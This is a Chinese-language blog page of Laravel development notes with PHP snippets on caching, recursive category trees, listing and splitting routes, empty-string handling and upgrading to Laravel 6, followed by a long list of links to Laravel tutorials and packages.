<h3 id="cache"><a href="#cache" class="headerlink" title="cache"></a>cache</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">use Illuminate\Support\Facades\Cache;</span><br><span class="line"></span><br><span class="line">Cache::get(<span class="string">'xxx'</span>);</span><br><span class="line">app(<span class="string">'Illuminate\Contracts\Cache\Factory'</span>)-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">app(<span class="string">'Illuminate\Cache\CacheManager'</span>)-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">app(<span class="string">'cache'</span>)-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">app()[<span class="string">'cache'</span>]-&gt;get(<span class="string">'xxx'</span>);</span><br><span class="line">cache(<span class="string">'xxx'</span>);</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">cache</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="built_in">arguments</span> = func_get_args();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (empty($<span class="built_in">arguments</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> app(<span class="string">'cache'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_string($<span class="built_in">arguments</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> app(<span class="string">'cache'</span>)-&gt;get(...$<span class="built_in">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! is_array($<span class="built_in">arguments</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(</span><br><span class="line">                <span class="string">'When setting a value in the cache, you must pass an array of key / value pairs.'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (! isset($<span class="built_in">arguments</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(</span><br><span class="line">                <span class="string">'You must specify an expiration time when setting a value in the cache.'</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> app(<span class="string">'cache'</span>)-&gt;put(key($<span class="built_in">arguments</span>[<span class="number">0</span>]), reset($<span class="built_in">arguments</span>[<span class="number">0</span>]), $<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">        https:<span class="comment">//learnku.com/articles/33628</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-的请求是怎么到达控制器"><a href="#Laravel-的请求是怎么到达控制器" class="headerlink" title="Laravel 的请求是怎么到达控制器"></a>Laravel 的请求是怎么到达控制器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="分类列表无限分类"><a href="#分类列表无限分类" class="headerlink" title="分类列表无限分类"></a>分类列表无限分类</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getTree</span>(<span class="params">$data,$pId,$level = <span class="number">0</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $list = [];</span><br><span class="line">        foreach ($data <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="comment">//第一次遍历,找到父节点为根节点的节点 也就是pid=0的节点</span></span><br><span class="line">            <span class="keyword">if</span> ($value[<span class="string">'parent_id'</span>] == $pId)&#123;</span><br><span class="line">                <span class="comment">//父节点为根节点的节点,级别为0，也就是第一级</span></span><br><span class="line">                $value[<span class="string">'level'</span>] = $level;</span><br><span class="line">                $value[<span class="string">'display_name'</span>] =$value[<span class="string">'displayname'</span>];</span><br><span class="line">                $value[<span class="string">'displayname'</span>] = str_repeat(<span class="string">'━━'</span>, $value[<span class="string">'level'</span>]).$value[<span class="string">'displayname'</span>];</span><br><span class="line"></span><br><span class="line">                <span class="comment">//把数组放到list中</span></span><br><span class="line">                $list[] = $value;</span><br><span class="line">                <span class="comment">//把这个节点从数组中移除,减少后续递归消耗</span></span><br><span class="line">                unset($data[$key]);</span><br><span class="line">                <span class="comment">//开始递归,查找父ID为该节点ID的节点,级别则为原级别+1</span></span><br><span class="line">                self::getTree($data, $value[<span class="string">'id'</span>], $level+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $list;</span><br><span class="line">    &#125;</span><br><span class="line">优雅的树形数据结构管理包,基于Closure Table模式设计. https:<span class="comment">//github.com/jiaxincui/closure-table</span></span><br></pre></td></tr></table></figure>
<h3 id="获取路由"><a href="#获取路由" class="headerlink" title="获取路由"></a>获取路由</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$routeCollection = \Route::getRoutes();</span><br><span class="line"></span><br><span class="line">foreach ($routeCollection <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    $routes[] = [$value-&gt;getPath(),$value-&gt;methods()[<span class="number">0</span>], $value-&gt;getActionName()];</span><br><span class="line">&#125;</span><br><span class="line">Route::get(<span class="string">'routes'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $routeCollection = Route::getRoutes();</span><br><span class="line"></span><br><span class="line">    echo <span class="string">"&lt;table style='width:100%'&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;tr&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='10%'&gt;&lt;h4&gt;HTTP Method&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='10%'&gt;&lt;h4&gt;Route&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='10%'&gt;&lt;h4&gt;Name&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;td width='70%'&gt;&lt;h4&gt;Corresponding Action&lt;/h4&gt;&lt;/td&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">        foreach ($routeCollection <span class="keyword">as</span> $value) &#123;</span><br><span class="line">            echo <span class="string">"&lt;tr&gt;"</span>;<span class="comment">//sina/vendor/laravel/framework/src/Illuminate/Routing/Route.php:919</span></span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getMethods()[<span class="number">0</span>] . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getPath() . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getName() . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">                echo <span class="string">"&lt;td&gt;"</span> . $value-&gt;getActionName() . <span class="string">"&lt;/td&gt;"</span>;</span><br><span class="line">            echo <span class="string">"&lt;/tr&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    echo <span class="string">"&lt;/table&gt;"</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/18394891/how-to-get-a-list-of-registered-route-paths-in-laravel</span></span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/15955295/displaying-registered-routes-in-laravel</span></span><br><span class="line"></span><br><span class="line">php artisan route:list  sina/vendor/laravel/framework/src/Illuminate/Foundation/Console/RouteListCommand.php:<span class="number">14</span></span><br></pre></td></tr></table></figure>
<h3 id="自动将空字符串转为-null"><a href="#自动将空字符串转为-null" class="headerlink" title="自动将空字符串转为 null"></a>自动将空字符串转为 null</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">laravel 有一个 ConvertEmptyStringsToNull 中间件，自动将空字符串转为 <span class="literal">null</span>。</span><br><span class="line">在 App\Http\Kernel.php 中，注释了这个中间件就好了。</span><br><span class="line"> QueryException In Connection.php line <span class="number">664</span> :</span><br><span class="line"> SQLSTATE[<span class="number">23000</span>]: Integrity constraint violation: <span class="number">1048</span> Column <span class="string">'judge_group'</span> cannot be <span class="literal">null</span></span><br><span class="line"> </span><br><span class="line"> 打印下 Request 返回的数据，Laravel 有个中间件会把 <span class="string">' '</span> 转为 <span class="literal">null</span>。https:<span class="comment">//learnku.com/laravel/t/35052</span></span><br></pre></td></tr></table></figure>
<h3 id="Laravel-5-5-升级到-6-0"><a href="#Laravel-5-5-升级到-6-0" class="headerlink" title="Laravel 5.5 升级到 6.0"></a>Laravel 5.5 升级到 6.0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用 phpredis 替代 predis</span><br><span class="line"></span><br><span class="line">Laravel 开始推荐使用 phpredis 来代替 predis。</span><br><span class="line"></span><br><span class="line">所以要记得先安装 phpredis, 然后在 config/app.php 中去掉 Redis 别名</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35056</span></span><br></pre></td></tr></table></figure>
<h3 id="API-和-后台接口分离"><a href="#API-和-后台接口分离" class="headerlink" title="API 和 后台接口分离"></a>API 和 后台接口分离</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">发现路由数量变多后影响到了性能，这个时候需要区别不同服务器去加载不同的路由。</span><br><span class="line"></span><br><span class="line">如何去别不同的服务器区别环境，但是又要区别是生产环境。</span><br><span class="line">可以使用 app()-&gt;environment(); 方法实现，生产环境和测试环境的区别。</span><br><span class="line"></span><br><span class="line">查看代码后发现可以使用更多的方法。</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取或检查当前应用程序环境。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return string|bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">environment</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 返回传递给函数的参数数量</span></span><br><span class="line">    <span class="keyword">if</span> (func_num_args() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果第一个参数是数组就去第一个，不是的话取全部的。</span></span><br><span class="line">        $patterns = is_array(func_get_arg(<span class="number">0</span>)) ? func_get_arg(<span class="number">0</span>) : func_get_args();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Str::is($patterns, $<span class="keyword">this</span>[<span class="string">'env'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>[<span class="string">'env'</span>];</span><br><span class="line">&#125;</span><br><span class="line">Str::is 函数判断给定的字符串是否匹配给定的模式。星号 * 可以用来表示通配符：</span><br><span class="line"></span><br><span class="line"># 判断在 API 环境</span><br><span class="line">app()-&gt;environment(<span class="string">"production.api"</span>);</span><br><span class="line"># 判断在 ADMIN 环境</span><br><span class="line">app()-&gt;environment(<span class="string">"production.admin"</span>);</span><br><span class="line"># 判断在所有环境</span><br><span class="line">app()-&gt;environment(<span class="string">"production.*"</span>);</span><br><span class="line">修改 RouteServiceProvider 文件</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define the routes for the application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 公共路由</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (app()-&gt;environment(<span class="string">'production.api'</span>)) &#123;</span><br><span class="line">        # production api 路由</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line">    &#125; elseif (app()-&gt;environment(<span class="string">'production.admin'</span>)) &#123;</span><br><span class="line">        # production admin 路由</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        # local testing stanging 环境下加载所有路由</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line"></span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35099</span></span><br></pre></td></tr></table></figure>
<h3 id="laravel路由分割"><a href="#laravel路由分割" class="headerlink" title="laravel路由分割"></a>laravel路由分割</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">Route::group([<span class="string">'middleware'</span> =&gt; [<span class="string">'web'</span>]], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'user'</span>, <span class="string">'namespace'</span> =&gt; <span class="string">'User'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span> app_path(<span class="string">'Http/Routes/user.php'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'admin'</span>, <span class="string">'namespace'</span> =&gt; <span class="string">'Admin'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span> app_path(<span class="string">'Http/Routes/admin.php'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    Route::group([<span class="string">'prefix'</span> =&gt; <span class="string">'api'</span>, <span class="string">'namespace'</span> =&gt; <span class="string">'Home'</span>], <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">require</span> app_path(<span class="string">'Http/Routes/homeapi.php'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">app/Providers/RouteServiceProvider.php 的 map 方法中可以如下定义：</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params">Router $router</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $router-&gt;group([<span class="string">'namespace'</span> =&gt; $<span class="keyword">this</span>-&gt;namespace], <span class="function"><span class="keyword">function</span> (<span class="params">$router</span>) </span>&#123;</span><br><span class="line">        <span class="comment">//require app_path('Http/routes.php');</span></span><br><span class="line">        foreach (glob(app_path(<span class="string">'Http//Routes'</span>) . <span class="string">'/*.php'</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;app-&gt;make(<span class="string">'App\\Http\\Routes\\'</span> . basename($file, <span class="string">'.php'</span>))-&gt;map($router);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/laravel/t/2484/the-best-way-to-split-routesphp-laravel-routing-file</span></span><br><span class="line">php artisan route:cache</span><br><span class="line"></span><br><span class="line">   public <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapWebRoutes();</span><br><span class="line">        $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">mapWebRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Route::group([</span><br><span class="line">            <span class="string">'middleware'</span> =&gt; <span class="string">'web'</span>,</span><br><span class="line">            <span class="string">'namespace'</span> =&gt; $<span class="keyword">this</span>-&gt;namespace,</span><br><span class="line">        ], <span class="function"><span class="keyword">function</span> (<span class="params">$router</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">require</span> base_path(<span class="string">'routes/web.php'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">mapApiRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Route::group([</span><br><span class="line">            <span class="string">'middleware'</span> =&gt; [<span class="string">'api'</span>, <span class="string">'auth:api'</span>],</span><br><span class="line">            <span class="string">'namespace'</span> =&gt; $<span class="keyword">this</span>-&gt;namespace,</span><br><span class="line">            <span class="string">'prefix'</span> =&gt; <span class="string">'api'</span>,</span><br><span class="line">        ], <span class="function"><span class="keyword">function</span> (<span class="params">$router</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">require</span> base_path(<span class="string">'routes/api.php'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">http:<span class="comment">//www.xiaot123.com/post/laravel_route</span></span><br><span class="line"></span><br><span class="line">按照URL</span><br><span class="line"><span class="keyword">if</span> (Str::is(<span class="string">'api.*'</span>, request()-&gt;server(<span class="string">'HTTP_HOST'</span>) ?? <span class="string">''</span>)) &#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line">&#125; elseif (Str::is(<span class="string">'admin.*'</span>, request()-&gt;server(<span class="string">'HTTP_HOST'</span>) ?? <span class="string">''</span>)) &#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapApiRoutes();</span><br><span class="line"></span><br><span class="line">      $<span class="keyword">this</span>-&gt;mapAdminRoutes();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/AlexStack/Laravel-CMS" target="_blank" rel="noopener">Laravel 项目的简单 CMS</a></p>
<p><a href="https://learnku.com/docs/the-laravel-way/5.6/Tao-1-1/2925" target="_blank" rel="noopener">Laravel 之道</a></p>
<p>Laravel 代码生成器 <a href="https://learnku.com/laravel/t/34772" target="_blank" rel="noopener">https://learnku.com/laravel/t/34772</a> <a href="https://github.com/GooGee/Entity-Builder" target="_blank" rel="noopener">https://github.com/GooGee/Entity-Builder</a></p>
<p><a href="https://github.com/yanlongma/docker-lnmp" target="_blank" rel="noopener">使用 Docker LNMP 部署 PHP 开发环境 </a></p>
<p><a href="https://learnku.com/laravel/t/34780" target="_blank" rel="noopener">PHP-fpm MongoDB 连接数 </a></p>
<p><a href="https://github.com/sheaxiang/shea" target="_blank" rel="noopener"> Laravel 源码写的一个简易框架</a></p>
<p><a href="https://learnku.com/articles/34628" target="_blank" rel="noopener">轻松部署 Laravel 应用 </a></p>
<p>接近免费的 SSL 证书 <a href="https://www.digital-sign.com.cn/register" target="_blank" rel="noopener">https://www.digital-sign.com.cn/register</a></p>
<p>一键生成 https 根域名证书更方便，推荐 certbot-auto 脚本</p>
<p><a href="https://github.com/mylxsw/wizard" target="_blank" rel="noopener">Laravel 的开源api文档管理系统 Wizard </a></p>
<p><a href="https://learnku.com/articles/34879" target="_blank" rel="noopener">CentOS7 轻松部署 Laravel 应用</a></p>
<p><a href="https://github.com/peinhu/aetherupload-laravel" target="_blank" rel="noopener">超大文件上传</a></p>
<p><a href="https://learnku.com/articles/34568" target="_blank" rel="noopener">使用 AetherUpload 视频上传过程</a></p>
<p><a href="https://github.com/kphcdr/axeadmin-laravel" target="_blank" rel="noopener">axeadmin 让你的 Laravel 快速拥有一个后台</a></p>
<p><a href="https://learnku.com/articles/34123" target="_blank" rel="noopener">Laravel 的请求是怎么到达控制器</a></p>
<p><a href="https://github.com/eleven26/listen-sql" target="_blank" rel="noopener">控制台实时查看 sql</a></p>
<p><a href="https://learnku.com/articles/33400" target="_blank" rel="noopener">HTTP 协议免费升级到 HTTPS</a></p>
<p><a href="https://github.com/wmhello/laravel_template_with_vue" target="_blank" rel="noopener"> Laravel-echo-server 开发聊天室和客服功能</a></p>
<p><a href="https://learnku.com/docs/the-laravel-way/5.6/Tao-1-1/2925" target="_blank" rel="noopener">laravel之道</a></p>
<p><a href="https://googee.github.io/Entity-Builder/dist/" target="_blank" rel="noopener">Laravel 代码生成工具</a></p>
<p><a href="https://learnku.com/articles/32007#replies" target="_blank" rel="noopener">Laravel 源码阅读 - Eloquent</a></p>
<p><a href="https://github.com/alexeymezenin/laravel-best-practices/blob/master/chinese.md" target="_blank" rel="noopener">laravel最佳实践</a></p>
<p><a href="https://github.com/sweida/laravel-blog-api/" target="_blank" rel="noopener">Laravel+vue 个人博客</a></p>
<p><a href="https://laravelacademy.org/laravel-from-appreciate-to-artisan" target="_blank" rel="noopener">Laravel 从学徒到工匠精校版 </a></p>
<p><a href="https://learnku.com/articles/32333" target="_blank" rel="noopener">服务容器</a></p>
<p><a href="https://github.com/immortalChensm/laravel5.8" target="_blank" rel="noopener">Laravel5.8 版本内核源码注解</a></p>
<p><a href="https://learnku.com/articles/32025" target="_blank" rel="noopener">Laravel-admin 源码分析系列</a></p>
<p><a href="https://learnku.com/articles/32007" target="_blank" rel="noopener">Laravel 源码阅读</a></p>
<p><a href="https://github.com/y-ui/laravel-data-masking" target="_blank" rel="noopener">Laravel 数据库脱敏工具</a></p>
<p><a href="https://github.com/xiaohuilam/laravel/wiki" target="_blank" rel="noopener">Laravel 深入浅出指南  </a></p>
<p><a href="https://github.com/immortalChensm/laravel-work" target="_blank" rel="noopener">Laravel5.5LTS 版本源码内核阅读注解</a></p>
<p><a href="https://leoyang90.gitbooks.io/laravel-source-analysis/content/" target="_blank" rel="noopener">laravel 源码详解https://github.com/LeoYang90/laravel-source-analysis</a></p>
<p><a href="https://github.com/shanyul/photosLive" target="_blank" rel="noopener">Laravel + Vue + Oss 搭建的图片墙</a></p>
<p><a href="https://github.com/tangtanglove/fullstack-backend" target="_blank" rel="noopener">基于 Laravel + Ant-design-pro 界面美观漂亮的后台</a></p>
<p><a href="https://learnku.com/articles/32025" target="_blank" rel="noopener">Laravel-admin 安装分析</a></p>
<p><a href="https://github.com/imnotdoubi/laravel-admin.git" target="_blank" rel="noopener">电子商务后台系统</a></p>
<p><a href="https://learnku.com/laravel/t/31585" target="_blank" rel="noopener">基于laravel的博客</a></p>
<p><a href="https://github.com/immortalChensm/laravel5.8" target="_blank" rel="noopener">laravel5.8版本源码分析</a></p>
<p><a href="https://learnku.com/laravel/t/30996" target="_blank" rel="noopener">基于 adminLTE3、Laravel、swoole 的微服务管理平台</a></p>
<p><a href="https://learnku.com/articles/25922#topnav" target="_blank" rel="noopener">Laravel-snappy 生成 PDF 踩坑记录</a></p>
<p><a href="https://learnku.com/articles/30878" target="_blank" rel="noopener">docker/laradock 安装</a></p>
<p><a href="https://learnku.com/articles/30858" target="_blank" rel="noopener">Laravel 融合 Markdown</a></p>
<p><a href="https://notes.lzis.me/notes/53" target="_blank" rel="noopener">Laravel框架关键技术解析</a></p>
<p><a href="https://learnku.com/articles/26864" target="_blank" rel="noopener">Laravel Markdown Blog</a></p>
<p><a href="https://github.com/yybawang/Adoc" target="_blank" rel="noopener">laravel markdown api文档</a></p>
<p><a href="https://learnku.com/articles/30607" target="_blank" rel="noopener"> markdown 来撰写文档</a></p>
<p><a href="https://learnku.com/articles/30812" target="_blank" rel="noopener">Laravel 融合 Elasticsearch/Algolia</a></p>
<p><a href="https://learnku.com/articles/22514" target="_blank" rel="noopener">Laravel Artisan 命令大全</a></p>
<p><a href="https://learnku.com/laravel/t/30061" target="_blank" rel="noopener">Laravel 底层分析系列文章：生命周期</a></p>
<p><a href="http://youyou-tech.com/2019/05/30/%E5%A4%A7%E8%AF%9D%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91%E7%9A%84%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/" target="_blank" rel="noopener">大话后端开发高高并发的奇技淫巧</a></p>
<p><a href="https://github.com/medz/cors" target="_blank" rel="noopener"> PHP 跨域的 CORS 中间件</a></p>
<p><a href="https://github.com/nfangxu/package-fx-translation" target="_blank" rel="noopener">Laravel 谷歌翻译</a></p>
<p><a href="https://learnku.com/articles/29669" target="_blank" rel="noopener">Laravel 搭建 Composer 包</a></p>
<p><a href="https://learnku.com/articles/29622" target="_blank" rel="noopener"> Laravel 和 layui 包含基础 RBAC 权限的管理后台</a></p>
<p><a href="https://learnku.com/laravel/t/29566" target="_blank" rel="noopener">生命周期和容器 Container</a></p>
<p><a href="https://github.com/maatwebsite/Laravel-Excel" target="_blank" rel="noopener">Supercharged Excel exports and imports in Laravel</a></p>
